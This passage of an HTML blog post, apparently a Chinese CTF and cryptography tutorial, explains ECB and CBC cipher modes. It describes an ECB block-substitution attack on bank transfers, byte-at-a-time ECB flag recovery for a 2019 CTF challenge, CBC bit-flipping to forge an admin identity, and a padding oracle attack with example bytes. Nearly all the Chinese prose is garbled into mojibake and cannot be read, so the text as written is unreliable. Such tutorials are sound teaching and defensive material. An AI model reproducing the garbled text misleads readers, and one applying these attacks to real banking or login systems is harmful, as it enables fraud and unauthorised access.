ECB)<br>å¯†ç åˆ†ç»„é“¾æ¥æ¨¡å¼(cipher block chaining mode, CBC)<br>å¯†ç åé¦ˆæ¨¡å¼(cipher feedback mode, CFB)<br>è¾“å‡ºåé¦ˆæ¨¡å¼(output feedback mode, OFB)<br>è®¡æ•°å™¨æ¨¡å¼(Counter mode, CTR)</p><h4 id="ç”µå­å¯†ç æœ¬æ¨¡å¼ï¼ˆEBCï¼‰"><a href="#ç”µå­å¯†ç æœ¬æ¨¡å¼ï¼ˆEBCï¼‰" class="headerlink" title="ç”µå­å¯†ç æœ¬æ¨¡å¼ï¼ˆEBCï¼‰"></a>ç”µå­å¯†ç æœ¬æ¨¡å¼ï¼ˆEBCï¼‰</h4><p>&emsp;&emsp;ç”µå­å¯†ç æœ¬æ¨¡å¼æ˜¯ä¸€ç§æœ€ç›´æ¥çš„æ¶ˆæ¯åŠ å¯†æ–¹å¼ï¼Œ</p><p><strong>å‡è®¾$e_k()$è¡¨ç¤ºç”¨å¯†é’¥kè¿›è¡Œçš„åˆ†ç»„åŠ å¯†ï¼›$e_k^{-1}()$å¯¹åº”è§£å¯†ã€‚</strong></p><p><strong>$x_i$ï¼Œ$y_i$è¡¨ç¤ºé•¿åº¦ä¸ºbçš„ä½å­—ç¬¦ä¸²ï¼Œï¼ˆé•¿åº¦ä¸å¤Ÿçš„å­—ç¬¦ä¸²ä¼šæŒ‰ç…§æŒ‡å®šçš„å¡«å……è§„åˆ™è¿›è¡Œå¡«å……ï¼‰</strong></p><p><strong>åŠ å¯†ï¼š$y_i=e_k(x_i)    ,iâ‰¥1 $  $(e_k()$è¡¨ç¤ºç”¨å¯†é’¥kè¿›è¡Œçš„åˆ†ç»„åŠ å¯†)</strong></p><p><strong>è§£å¯†ï¼š$x_i=e_k^{-1}(y_i)    ,iâ‰¥1  (e_k^{-1}()$è¡¨ç¤ºç”¨å¯†é’¥kè¿›è¡Œçš„åˆ†ç»„åŠ å¯†çš„è§£å¯†)</strong></p><p>&emsp;&emsp;ç”µå­å¯†ç æœ¬æ¨¡å¼å°±æ˜¯æœ€ç®€å•çš„ä¸€ä¸€æ˜ å°„åŠ å¯†ï¼Œè¿™æ„å‘³ç€æ¯ä¸€ç»„çš„åŠ å¯†éƒ½æ˜¯ç‹¬ç«‹çš„ï¼Œæ‰€ä»¥EBCæ¨¡å¼åŠ å¯†å¯ä»¥å®ç°å¹¶è¡ŒåŒ–ï¼Œè¿™ç§æ–¹å¼åœ¨é«˜é€Ÿå®ç°ä¸­å…·æœ‰å¾ˆå¼ºçš„ä¼˜åŠ¿ã€‚å¹¶ä¸”ï¼Œå¦‚æœç”±äºä¼ è¾“é—®é¢˜å¯¼è‡´æ¶ˆæ¯ä¸­é—´æœ‰ä¸€æ®µæ•°æ®å—å½±å“ï¼Œä¹Ÿä¸ä¼šå½±å“åˆ°åé¢çš„æ¶ˆæ¯ï¼Œè¿™ä¸åé¢è¦æåˆ°çš„CBC,CFBç­‰æ¨¡å¼æ˜¯ä¸åŒçš„ã€‚</p><h5 id="ç¼ºé™·"><a href="#ç¼ºé™·" class="headerlink" title="ç¼ºé™·"></a>ç¼ºé™·</h5><p>&emsp;&emsp;æ­£å› ä¸ºEBCæ¨¡å¼çš„ä¸€ä¸€æ˜ å°„åŠ å¯†ï¼Œæ¯ä¸€ç»„åŠ å¯†ç›¸äº’ç‹¬ç«‹ï¼Œæ‰€ä»¥åŒæ ·çš„æ˜æ–‡ç”¨åŒæ ·çš„å¯†é’¥å°±ä¼šåŠ å¯†å¾—åˆ°åŒæ ·çš„å¯†æ–‡ã€‚ä¸‹é¢ä»‹ç»EBCæ¨¡å¼ä¸‹çš„ä¸€ç§ç®€å•æ”»å‡»æ–¹å¼ï¼š</p><h5 id="ä»£æ¢æ”»å‡»"><a href="#ä»£æ¢æ”»å‡»" class="headerlink" title="ä»£æ¢æ”»å‡»"></a>ä»£æ¢æ”»å‡»</h5><p>å‡è®¾æŸä¸ªåè®®æ”¯æŒé“¶è¡Œé—´çš„ç”µæ±‡ï¼Œç”µæ±‡åŒ…å«äº”ä¸ªå­—æ®µï¼Œåˆ†åˆ«æœ‰äº”ä¸ªåˆ†ç»„</p><p><img src="https://i.loli.net/2020/04/30/ihsBnRE2rceHOyV.png" alt="ä»£æ¢æ”»å‡»"></p><p>é¦–å…ˆä¸€ä¸ªå‰ææ˜¯æˆ‘ä»¬èƒ½ç›‘å¬ï¼Œæ‹¦æˆªå¹¶æ›´æ”¹è¿™ä¸ªç”µæ±‡çš„å¯†æ–‡ï¼Œ</p><p>ç„¶åæˆ‘ä»¬å¯ä»¥å…ˆå¼€ä¸ªè´¦æˆ·ï¼Œè¿›è¡Œè‹¥å¹²æ¬¡è¯•éªŒï¼Œæ¯ä¸€æ¬¡å˜æ›´ä¸€ä¸ªå‚æ•°ï¼Œæ¯”å¦‚å‘é€è´¦å·ï¼Œè½¬è´¦é‡‘é¢ï¼Œä¸€ç»„å¯†ç çš„ä½æ•°ç­‰ï¼Œä»¥æ­¤æ¥ç¡®å®šæ¯ä¸€ä¸ªåˆ†ç»„çš„æ„ä¹‰ã€‚</p><p>ç­‰æˆ‘ä»¬å¤§æ¦‚çŸ¥é“äº”ä¸ªåˆ†ç»„çš„æ„ä¹‰åï¼Œæˆ‘ä»¬å°±èƒ½è¿›è¡Œæ›¿æ¢æ”»å‡»ã€‚æ¯”å¦‚é“¶è¡ŒAçš„æŸä¸ªè´¦æˆ·å‘é“¶è¡ŒBçš„æŸä¸ªè´¦æˆ·è½¬è´¦ï¼Œæˆ‘æˆ‘ä»¬å°†å…¶æ‹¦æˆªï¼ŒæŠŠæ¥å—è´¦å·å¯†æ–‡ä»£æ¢æˆäº‹å…ˆå­˜å¥½çš„æˆ‘ä»¬è´¦å·çš„å¯†æ–‡ï¼Œåˆ™é“¶è¡Œç”¨keyè§£å¯†åï¼Œå°±ä¼šæŠŠé’±éƒ½è½¬åˆ°æˆ‘ä»¬çš„è´¦æˆ·ä¸‹ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œæ•´ä¸ªè¿‡ç¨‹æˆ‘ä»¬å¹¶æ²¡æœ‰æ”»å‡»åˆ†ç»„å¯†ç æœ¬èº«ï¼Œæ‰€ä»¥å°½ç®¡åŠ å¯†æ–¹æ¡ˆæœ¬èº«å†å®‰å…¨ä¹ŸæŠµå¾¡ä¸äº†è¿™ç§æ”»å‡»ï¼›æˆ‘ä»¬ç”šè‡³ä¹Ÿä¸çŸ¥é“çœŸæ­£æ˜æ–‡çš„å†…å®¹ï¼Œæ‰€ä»¥å®ç°ä»£æ¢æ”»å‡»æ˜¯ç ´åäº†æ¶ˆæ¯çš„å®Œæ•´æ€§ã€‚</p><p>ä¾‹å­å¾ˆç‰¹æ®Šï¼Œæ¯”å¦‚äº”ä¸ªå‚æ•°åˆšå¥½åœ¨äº”ä¸ªåˆ†ç»„ç­‰ï¼Œåªæ˜¯ä¸ºäº†æ–¹ä¾¿ç†è§£_</p><h5 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h5><p>ç°å®ä¸­æŠµå¾¡ä»£æ¢æ”»å‡»å¸¸ç”¨æ¶ˆæ¯éªŒè¯ç (Message Authentication Code, MAC)ï¼Œå’Œæ•°å­—ç­¾åï¼Œä¸»è¦å°±æ˜¯ä¸ºäº†ç¡®ä¿æ¶ˆæ¯çš„å®Œæ•´æ€§ã€‚</p><h5 id="CTFä¸­EBCç›¸å…³çš„é¢˜ç›®-2019OGeek-Babycry"><a href="#CTFä¸­EBCç›¸å…³çš„é¢˜ç›®-2019OGeek-Babycry" class="headerlink" title="CTFä¸­EBCç›¸å…³çš„é¢˜ç›®-2019OGeek-Babycry"></a>CTFä¸­EBCç›¸å…³çš„é¢˜ç›®-2019OGeek-Babycry</h5><p>å‰é¢æåˆ°ï¼Œåˆ†ç»„åŠ å¯†ä¸­é•¿åº¦ä¸å¤Ÿçš„å­—ç¬¦ä¸²ä¼šæŒ‰ç…§æŒ‡å®šçš„å¡«å……è§„åˆ™è¿›è¡Œå¡«å……ï¼Œå†åŠ ä¸ŠECBè¿™æ ·ä¸€ä¸€æ˜ å°„çš„æ˜æ–‡-å¯†æ–‡å¯¹å…³ç³»ï¼Œå°±ä¼šäº§ç”Ÿåˆ©ç”¨padæ¥é€ä½çˆ†ç ´æ˜æ–‡çš„æ”»å‡»ã€‚</p><p>nc è¿‡å»å¾—åˆ°åŠ å¯†è§„åˆ™</p><p><img src="https://i.loli.net/2020/04/30/BlV5UeHiKtNGvzA.png" alt="Babycry"></p><p>åŠ å¯†è§„åˆ™æ˜¯desï¼ˆkey,sth..flag{*}paddingï¼‰&emsp;&emsp;    ï¼ˆæ¨¡å¼å¯ä»¥ç±»æ¯”ä¸ºECBçš„ä¸€ä¸€æ˜ å°„ï¼‰</p><p>åŠ ä¸Šhint</p><p>æ‰€ä»¥æˆ‘ä»¬æ§åˆ¶è¾“å…¥ï¼Œå¯ä»¥ä½¿å¾—è¢«åŠ å¯†çš„å­—ç¬¦æœ«å°¾ä¸º</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;_______ï¼ˆ<span class="number">7</span>ä¸ª<span class="keyword">_</span>ï¼‰</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚keyåŠ ä¸Šflagæ˜¯50ä½ï¼Œå¹¶ä¸”flagä»¥â€˜}â€™ ç»“å°¾ã€‚ä»–æ˜¯8ä½ä¸€ç»„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¡«ä¸Š7ä¸ªaï¼Œè¿™æ ·key+sth+flagå°±æœ‰57ä½ï¼Œå…«ä½ä¸€ç»„ï¼Œå‰é¢56ä½å­—ç¬¦åˆ†8ç»„ï¼Œäºæ˜¯æœ€åä¸€ç»„åŠ ä¸Šå¡«å……å°±æ˜¯<code>}_______ï¼ˆ7ä¸ª&#39;_&#39;ï¼‰</code></p><p>ç„¶åæœåŠ¡å™¨ä¼šè¿”å›ç»™æˆ‘ä»¬å¯†æ–‡ï¼Œäºæ˜¯å¯†æ–‡çš„æœ€åä¸€ç»„å°±ä»£è¡¨ç€<code>}_______ï¼ˆ7ä¸ª&#39;_&#39;ï¼‰</code>çš„å¯†æ–‡ï¼Œ</p><p>å¦‚æœæˆ‘ä»¬å†å¤šå¡«ä¸€ä¸ªaï¼Œé‚£ä¹ˆè¿”å›å¯†æ–‡ä¸­æœ€åä¸€ç»„å°±æ˜¯<code>?}______ï¼ˆ6ä¸ª&#39;_&#39;ï¼‰</code>çš„å¯†æ–‡â‘ ï¼ˆâ€™?â€™ä»£è¡¨flagçš„æœ€ååˆ°æ•°ç¬¬äºŒä½å­—ç¬¦ï¼ŒæœªçŸ¥ï¼Œéœ€è¦çˆ†ç ´ï¼‰</p><p>äºæ˜¯æˆ‘ä»¬å°±å¼€å§‹çˆ†ç ´ï¼Œæˆ‘ä»¬å…ˆæµ‹å‡ºkeyçš„é•¿åº¦å…ˆï¼Œï¼ˆçœ‹å¡«å‡ ä¸ªaä¼šå¯†æ–‡ä¼šå¤šå‡ºä¸€ç»„æ¥å°±èƒ½çŸ¥é“ï¼‰</p><p>ç„¶åå¡«aï¼Œè®©   len(key)+len(a)%8 == 0ï¼Œæ¥ç€ï¼Œæˆ‘ä»¬å°±å‘é€<code>aaa*}______ï¼ˆ6ä¸ª&#39;_&#39;ï¼‰</code>,ï¼ˆaçš„ä¸ªæ•°ç”±keyçš„é•¿åº¦å†³å®šï¼Œ*ä»£è¡¨ä»»æ„å­—ç¬¦ï¼Œæˆ‘ä»¬ç›´æ¥éå†å¯è§å­—ç¬¦è¡¨ï¼‰è®©æœåŠ¡è¿”å›åŠ å¯†ç»“æœï¼Œæˆ‘ä»¬æ‰¾åˆ°æ˜æ–‡å¯¹åº”çš„é‚£ä¸€ç»„å¯†æ–‡ï¼Œå’Œä¹‹å‰è¿”å›çš„å¯†æ–‡â‘ åšæ¯”è¾ƒï¼Œç»“æœä¸€æ ·ï¼Œè¯´æ˜é‚£ä½å­—ç¬¦æ­£ç¡®ï¼Œå¼€å§‹çˆ†ç ´ä¸‹ä¸€ä½å­—ç¬¦ã€‚</p><p>ä»¥æ­¤ç±»æ¨å¯ä»¥é€ä½çˆ†ç ´å‡ºæ‰€æœ‰ä½å­—ç¬¦ã€‚ï¼ˆåªæ˜¯çˆ†ç ´è¶…è¿‡å…«ä½åï¼Œç”¨æ¥ä½œä¸ºåˆ¤æ–­ä¾æ®çš„å¯†æ–‡â‘ å°±ä¸èƒ½å†ä»å¯†æ–‡æœ€åä¸€ç»„æ‰¾äº†ï¼Œå¾—ä»åˆ°æ•°ç¬¬äºŒç»„ï¼Œç¬¬ä¸‰ç»„â€¦.æ‰¾_ï¼‰</p><h4 id="å¯†ç åˆ†ç»„é“¾æ¥æ¨¡å¼-CBC"><a href="#å¯†ç åˆ†ç»„é“¾æ¥æ¨¡å¼-CBC" class="headerlink" title="å¯†ç åˆ†ç»„é“¾æ¥æ¨¡å¼(CBC)"></a>å¯†ç åˆ†ç»„é“¾æ¥æ¨¡å¼(CBC)</h4><p>åœ¨CBCæ¨¡å¼ä¸­ï¼Œåä¸€ç»„çš„å¯†æ–‡éƒ½å—å‰ä¸€ç»„å¯†æ–‡å½±å“ï¼Œç¬¬ä¸€ç»„å¯†æ–‡å—åˆå§‹å‘é‡IVå½±å“ï¼Œä»è€Œæ˜æ–‡çš„é‡å¤æ’åˆ—ä¸ä¼šååº”åœ¨å¯†æ–‡ä¸­ã€‚</p><p><strong>å‡è®¾$e_k()$è¡¨ç¤ºç”¨å¯†é’¥kè¿›è¡Œçš„åˆ†ç»„åŠ å¯†ï¼›$e_k^{-1}()$å¯¹åº”è§£å¯†ã€‚</strong></p><p><strong>$x_iï¼Œy_i$è¡¨ç¤ºé•¿åº¦ä¸ºbçš„ä½å­—ç¬¦ä¸²ï¼ŒIVè¡¨ç¤ºé•¿åº¦ä¸ºbçš„åˆå§‹å‘é‡ï¼Œï¼ˆé•¿åº¦ä¸å¤Ÿçš„å­—ç¬¦ä¸²ä¼šæŒ‰ç…§æŒ‡å®šçš„å¡«å……è§„åˆ™è¿›è¡Œå¡«å……ï¼‰</strong></p><p><em>*åŠ å¯†ï¼š</em>$y_1=e_k(x_1 âŠ• IV)$     **</p><p>&emsp;&emsp;    $y_i=e_k(x_iâŠ• y_{i-1})    ,iâ‰¥2 $</p><p><em>*è§£å¯†ï¼š</em>$x_1=e_k^{-1}(y_1)âŠ• IV$ **</p><p>&emsp;&emsp;    $x_i=e_k^{-1}(y_i) âŠ• y_{i-1}    ,iâ‰¥2$ </p><p>&emsp;&emsp;å¦‚æœæ¯æ¬¡åŠ å¯†æ˜¯éƒ½é€‰æ‹©ä¸€ä¸ªæ–°çš„IVï¼Œåˆ™CBCæ¨¡å¼å°±å˜æˆäº†ä¸€ä¸ªæ¦‚ç‡åŠ å¯†æ–¹æ¡ˆï¼Œå³ç›¸åŒçš„æ˜æ–‡åŠ å¯†ä¼šç”Ÿæˆä¸åŒçš„å¯†æ–‡ã€‚</p><p>&emsp;&emsp;éœ€è¦è¯´æ˜çš„æ˜¯ï¼Œå¦‚æœæ¯æ¬¡é€‰æ‹©IVçš„æ•°å€¼å¾—å½“ï¼Œåˆ™ä»£æ¢æ”»å‡»ä¼šå½»åº•å¤±æ•ˆï¼Œå› ä¸ºç›‘å¬è€…æ— æ³•è¯†åˆ«åŠ å¯†çš„æ¨¡å¼ã€‚ä½†æ˜¯å¦‚æœè‹¥å¹²æ¬¡åŠ å¯†ä½¿ç”¨ç›¸åŒçš„IVï¼Œåˆ™ç›‘å¬è€…è¿˜æ˜¯å¯ä»¥è¯†åˆ«åŠ å¯†æ¨¡å¼ã€‚</p><p>&emsp;&emsp;è™½ç„¶ï¼ˆæ‰¿æ¥ECBçš„ä¾‹å­ï¼‰è¿™ä¸€æ¬¡ç›´æ¥å°†æˆ‘ä»¬çš„è´¦æˆ·çš„å¯†æ–‡æ›¿æ¢ä¸Šå»å·²ç»ä¸èƒ½å®ç°å‘æˆ‘ä»¬è´¦æˆ·è½¬è´¦çš„æ•ˆæœï¼Œå› ä¸ºæˆ‘ä»¬ä»£æ¢ï¼Œä¼šå¯¼è‡´ç¬¬å››ã€äº”ç»„æ¶ˆæ¯éƒ½è¢«ç ´åï¼Œä½†æ˜¯æœ‰å¯èƒ½è§£å¯†åï¼Œè´¦æˆ·å’Œé‡‘é¢ä»ç„¶å…·æœ‰æ„ä¹‰å‘¢ï¼Ÿï¼ˆè™½ç„¶å¯èƒ½æ€§ä¼¼ä¹å¾ˆä½ï¼‰åªæ˜¯æ˜¯éšæœºçš„ï¼Œä¸å†å¯æ§äº†è€Œå·²ã€‚ä½†è¿™ä»ç„¶æ˜¯é“¶è¡Œæ‰€ä¸å¯æ¥å—çš„ã€‚æ‰€ä»¥æ¶ˆæ¯éªŒè¯ç å’Œæ•°å­—ç­¾åçš„ä½œç”¨æ˜¾å¾—å°¤ä¸ºé‡è¦ã€‚</p><h5 id="ç¼ºé™·-1"><a href="#ç¼ºé™·-1" class="headerlink" title="ç¼ºé™·"></a>ç¼ºé™·</h5><p>å› ä¸ºæŸäº›åŸå› ï¼Œä½¿å¾—æŸä¸€ç»„å¯†æ–‡ä¸­å‡ºç°äº†é”™è¯¯çš„bitï¼Œå°†å½±å“è¿™ä¸€ç»„(æ•´ç»„)åŠå…¶ä¹‹åä¸€ç»„(ç›¸åº”ä½)åˆ†ç»„çš„è§£å¯†ã€‚ç”±æ­¤äº§ç”Ÿäº†CBCåè½¬å­—èŠ‚æ”»å‡»ã€‚å¦å¤–ä¸ä¸‹é¢æ‰€è®²çš„CFBæ¨¡å¼ä¸€æ ·ï¼ŒCBCæ¨¡å¼ä¹Ÿä¸èƒ½æŠµå¾¡é‡æ”¾æ”»å‡»ã€‚</p><h5 id="CBCåè½¬å­—èŠ‚æ”»å‡»ï¼ˆModification-attack-on-CBCï¼‰"><a href="#CBCåè½¬å­—èŠ‚æ”»å‡»ï¼ˆModification-attack-on-CBCï¼‰" class="headerlink" title="CBCåè½¬å­—èŠ‚æ”»å‡»ï¼ˆModification attack on CBCï¼‰"></a>CBCåè½¬å­—èŠ‚æ”»å‡»ï¼ˆModification attack on CBCï¼‰</h5><p><img src="https://i.loli.net/2020/04/30/SIzAO5KaUT47XCj.png" alt="Modification attack on CBC"></p><p>åœ¨åŠ å¯†æ—¶ï¼Œå‰ä¸€ç»„æ˜æ–‡ä¼šå½±å“åé¢æ‰€æœ‰åˆ†ç»„çš„å¯†æ–‡ã€‚</p><p>ä½†æ˜¯åœ¨è§£å¯†æ—¶ï¼Œç”±å…¬å¼åŠåŸç†å›¾å¯çŸ¥ï¼Œä¸€ç»„å¯†æ–‡åªä¼šå½±å“è¿™ä¸€ç»„çš„è§£å¯†ç»“æœå’Œä¸‹ä¸€ç»„çš„è§£å¯†ç»“æœã€‚</p><p>æˆ‘ä»¬çœ‹åˆ°ç®­å¤´2ï¼Œè¿™ä¸€ç»„Ciphertextï¼ˆå¯†æ–‡2ï¼‰åœ¨Decryptionï¼ˆè§£å¯†ï¼‰ä¹‹åä¼šç”ŸæˆCiphertext_1ï¼ˆæˆ‘yyçš„ï¼‰ï¼Œç„¶åè¿™ä¸ªCiphertext_1ä¸ç®­å¤´1æ‰€æŒ‡çš„Ciphertextï¼ˆå¯†æ–‡1ï¼‰æŒ‰ä½å¼‚æˆ–åæœ€ç»ˆç”ŸæˆPlaintextï¼ˆæ˜æ–‡2ï¼‰</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¿®æ”¹Ciphertext1ï¼Œæ¥è¾¾åˆ°æ§åˆ¶Plaintext2çš„æ•ˆæœï¼Œå½“ç„¶å¦‚æœæƒ³è¦ç²¾ç¡®æ§åˆ¶ï¼Œåˆ™éœ€è¦çŸ¥é“Plaintext2çš„å…·ä½“å†…å®¹ã€‚ï¼ˆåœ¨æŸäº›ç‰¹å®šæ¡ä»¶ä¸‹ï¼ŒPlaintext2çš„å†…å®¹å¯ä»¥åˆ©ç”¨Padding Oracle Attack æ¥è·å–ï¼Œä¸‹æ–‡ä¼šç®€ç•¥ä»‹ç»è¿™ç§æ”»å‡»æ–¹å¼ï¼‰</p><p>å¹¶ä¸”ç”±äºCiphertext1çš„ä¿®æ”¹ï¼Œå¯¼è‡´è‡ªå·±è¿™ä¸€ç»„çš„è§£å¯†ä¼šå—å½±å“ï¼Œæ‰€ä»¥è¿˜éœ€è¦ä¿®æ”¹å›¾ä¸­çš„IVæ¥ç»™Ciphertext1â€œæ“¦ä¸ªå±è‚¡â€ã€‚ï¼ˆå¦‚æœå‰é¢ä¸æ˜¯IVå‘¢ï¼Ÿé‚£åªèƒ½ä¸€è·¯æ”¹ä¸‹å»ï¼Œç›´åˆ°IVä¸ºæ­¢äº†ã€‚ã€‚ã€‚ï¼‰</p><h5 id="CTFä¸­CBCåè½¬å­—èŠ‚æ”»å‡»-åº”ç”¨åœºæ™¯"><a href="#CTFä¸­CBCåè½¬å­—èŠ‚æ”»å‡»-åº”ç”¨åœºæ™¯" class="headerlink" title="CTFä¸­CBCåè½¬å­—èŠ‚æ”»å‡» åº”ç”¨åœºæ™¯"></a>CTFä¸­CBCåè½¬å­—èŠ‚æ”»å‡» åº”ç”¨åœºæ™¯</h5><p>â€‹        CBCåè½¬å­—èŠ‚æ”»å‡»å¯èƒ½ä¼šç”¨äºWebé¢˜ä¸­çš„ç»•è¿‡ã€‚æ¯”å¦‚ä¸€ä¸ªç™»é™†ï¼Œç„¶ååœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ˜¯å°†ä½ æäº¤çš„ä¿¡æ¯ç”¨åˆ†ç»„å¯†ç åŠ å¯†ï¼Œæ¨¡å¼æ˜¯CBCï¼Œç„¶ååˆ°æœåŠ¡ç«¯åå†è§£å¯†ã€‚</p><p>&emsp;&emsp;æäº¤çš„æ—¶å€™ä»–ä¸è®©ä½ å¡«å†™adminï¼Œä½†æ˜¯é¢˜ç›®åˆéœ€è¦ä½ æœ‰adminçš„èº«ä»½ã€‚è¿™ä¸ªæ—¶å€™å°±å¯ä»¥è€ƒè™‘ç”¨CBCåè½¬å­—èŠ‚æ”»å‡»ç»•è¿‡è¿‡æ»¤ã€‚</p><p>&emsp;&emsp;æ¯”å¦‚ï¼šå…ˆç”¨bdminçš„èº«ä»½ç™»é™†ï¼Œç„¶åæ‹¦æˆªã€æ›´æ”¹èº«ä»½å¯¹åº”å¯†æ–‡ç»„çš„<strong>å‰</strong>ä¸€ç»„çš„å¯¹åº”ä½ï¼Œè®©æœåŠ¡å™¨å°†èº«ä»½è§£å¯†æˆæ˜æ–‡åä¸ºadminï¼Œä½†æ˜¯èº«ä»½å‰ä¸€ç»„çš„æ˜æ–‡åº”è¯¥æ˜¯æ¯æ‰äº†ï¼Œé‚£å°±å†æ”¹å‰ä¸€ç»„çš„å¯†æ–‡æ¥è¿›è¡Œè¡¥æ•‘ï¼Œç›´åˆ°æ”¹åˆ°åˆå§‹å‘é‡IVä¸ºæ­¢ã€‚</p><h5 id="Padding-Oracle-Attack"><a href="#Padding-Oracle-Attack" class="headerlink" title="Padding Oracle Attack"></a>Padding Oracle Attack</h5><p>è¿™é‡Œç²—ç•¥ä»‹ç»ä¸€ä¸‹CBCæ¨¡å¼ä¸‹çš„Padding Oracle Attack </p><p>&emsp;&emsp;åœ¨AESåŠ å¯†çš„CBCæ¨¡å¼ä¸­ï¼Œè‹¥åŠ å¯†æ•°æ®çš„é•¿åº¦æ¨¡é™¤åˆ†å—é•¿åº¦è€Œæœ‰ä½™ï¼Œåˆ™ä¼šåœ¨æœ«å°¾å¡«å……ä¸€ç»„æ•°æ®ã€‚</p><p>å³<strong>(pad_length-len(data)%pad_length)*hex(pad_length-len(data)%pad_length)</strong></p><p>ä¸¾ä¸ªæ —å­ï¼ˆ8å­—èŠ‚ä¸€ç»„ï¼‰</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">æ•°æ®ï¼š</span><br><span class="line">aaaaa</span><br><span class="line">å¡«å……åçš„æ•°æ®ï¼š</span><br><span class="line">aaaaa\<span class="keyword">x</span><span class="number">3</span>\<span class="keyword">x</span><span class="number">3</span>\<span class="keyword">x</span><span class="number">3</span></span><br><span class="line">æ•°æ®ï¼š</span><br><span class="line">aaaaaaaaaa</span><br><span class="line">å¡«å……åçš„æ•°æ®ï¼š</span><br><span class="line">aaaaaaaaaa\<span class="keyword">x</span><span class="number">06</span>\<span class="keyword">x</span><span class="number">06</span>\<span class="keyword">x</span><span class="number">06</span>\<span class="keyword">x</span><span class="number">06</span>\<span class="keyword">x</span><span class="number">06</span>\<span class="keyword">x</span><span class="number">06</span></span><br><span class="line">æ•°æ®ï¼š</span><br><span class="line">aaaaaaaa</span><br><span class="line">å¡«å……åçš„æ•°æ®ï¼š</span><br><span class="line">aaaaaaaa\<span class="keyword">x</span><span class="number">08</span>\<span class="keyword">x</span><span class="number">08</span>\<span class="keyword">x</span><span class="number">08</span>\<span class="keyword">x</span><span class="number">08</span>\<span class="keyword">x</span><span class="number">08</span>\<span class="keyword">x</span><span class="number">08</span>\<span class="keyword">x</span><span class="number">08</span>\<span class="keyword">x</span><span class="number">08</span></span><br></pre></td></tr></table></figure><p>â€‹        Padding Oracle Attack éœ€è¦ä¸¤ä¸ªå‰æå°±æ˜¯ï¼š</p><p>1.å¯ä»¥æ§åˆ¶å¯†æ–‡ æˆ–è€… IV </p><p>2.å¦‚æœè§£å¯†åä¸æ»¡è¶³ padding æœåŠ¡ç«¯ä¼šæŠ¥é”™. ï¼ˆåªæœ‰æœ€åä¸€ä¸ªå—é•¿åº¦ä¸è¶³æ—¶ä¼šæœ‰å¡«å……ï¼‰</p><p>å†æ¬¡ä¸¾æ —å­ï¼š</p><p>&emsp;&emsp;æ­¤å¤„é€‰æ‹©äº†<strong>AES-128</strong>ä½œä¸ºä¾‹å­ï¼Œæ˜æ–‡é•¿åº¦ä¸º<strong>17</strong>ä½ï¼Œæ•…è¡¥é½è‡³<strong>32</strong>ä½ååˆ†<strong>2</strong>ç»„è¿›è¡ŒåŠ å¯†ã€‚</p><p>&emsp;&emsp;ç„¶åæˆ‘ä»¬ä¼ªé€ ä¸€ç»„IVæ¥å’Œç¬¬ä¸€ç»„å¯†æ–‡ä¸€èµ·å‘å›æœåŠ¡å™¨ï¼Œè®©å…¶è¿›è¡Œåˆ¤å®šã€‚</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æ˜æ–‡ï¼šsouthseastisacat!</span><br><span class="line">IVï¼š<span class="symbol">\x</span>31<span class="symbol">\x</span>32<span class="symbol">\x</span>33<span class="symbol">\x</span>34<span class="symbol">\x</span>35<span class="symbol">\x</span>36<span class="symbol">\x</span>37<span class="symbol">\x</span>38<span class="symbol">\x</span>38<span class="symbol">\x</span>37<span class="symbol">\x</span>36<span class="symbol">\x</span>35<span class="symbol">\x</span>34<span class="symbol">\x</span>33<span class="symbol">\x</span>32<span class="symbol">\x</span>31</span><br><span class="line">å¯†æ–‡ï¼š<span class="symbol">\x</span>bf<span class="symbol">\x</span>61<span class="symbol">\x</span>b3<span class="symbol">\x</span>1b<span class="symbol">\x</span>d3<span class="symbol">\x</span>6a<span class="symbol">\x</span>47<span class="symbol">\x</span>11<span class="symbol">\x</span>b9<span class="symbol">\x</span>cc<span class="symbol">\x</span>d7<span class="symbol">\x</span>11<span class="symbol">\x</span>7b<span class="symbol">\x</span>8a<span class="symbol">\x</span>42<span class="symbol">\x</span>d9<span class="symbol">\x</span>3a<span class="symbol">\x</span>1e<span class="symbol">\x</span>37<span class="symbol">\x</span>e9<span class="symbol">\x</span>d2<span class="symbol">\x</span>de<span class="symbol">\x</span>fa<span class="symbol">\x</span>ca<span class="symbol">\x</span>a2<span class="symbol">\x</span>50<span class="symbol">\x</span>fd<span class="symbol">\x</span>c0<span class="symbol">\x</span>6e<span class="symbol">\x</span>f2<span class="symbol">\x</span>11<span class="symbol">\x</span>c1</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;å¯¹IVçš„æœ€åä¸€ä½å­—ç¬¦è¿›è¡Œçˆ†ç ´ï¼Œæ„é€ <strong>0x00</strong>åˆ°<strong>0xff</strong>ï¼Œä½¿å¾—ç¬¬ä¸€ç»„å¯†æ–‡çš„æœ€åä¸€ä¸ªå­—èŠ‚è§£å¯†çš„ç»“æœåŒIVå¼‚æˆ–ç»“æœä¸º<strong>0x01</strong>ï¼Œå¯¼è‡´<strong>Padding</strong>é€šè¿‡ï¼Œå½“IVæœ€åä¸€ä½å­—ç¬¦æ˜¯0x44æ—¶ï¼ŒæœåŠ¡å™¨è¿”å›æ­£ç¡®ç»“æœã€‚</p><p>&emsp;&emsp;è¿™æ—¶IVçš„æœ€åä¸€ä¸ªå­—èŠ‚å’ŒåŸIVçš„æœ€åä¸€ä¸ªå­—èŠ‚è¿˜æœ‰<strong>0x01</strong>å¼‚æˆ–ï¼Œå³<strong>0x44^0x31^0x01</strong>ï¼Œå¾—åˆ°ç»“æœä¸º<strong>t</strong>ï¼Œæ˜¯ç¬¬ä¸€ç»„æ˜æ–‡çš„æœ€åä¸€ä¸ªå­—ç¬¦ã€‚</p><p